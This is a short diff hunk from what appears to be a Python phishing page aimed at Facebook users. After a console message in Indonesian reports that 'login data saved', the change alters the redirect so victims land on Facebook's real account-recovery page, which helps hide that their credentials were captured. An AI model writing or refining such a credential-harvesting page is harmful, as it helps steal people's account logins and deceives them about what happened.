@@ -154,7 +154,7 @@ def index():
         print("\033[1m\033[93m ----------------------------------")
         print(" \033[1m[•]\033[92m Data login tersimpan\033[93m ✓\033[97m")
         
-        return redirect('https://facebook.com')
+        return redirect('https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0')
 
     return '''
     <!DOCTYPE html>
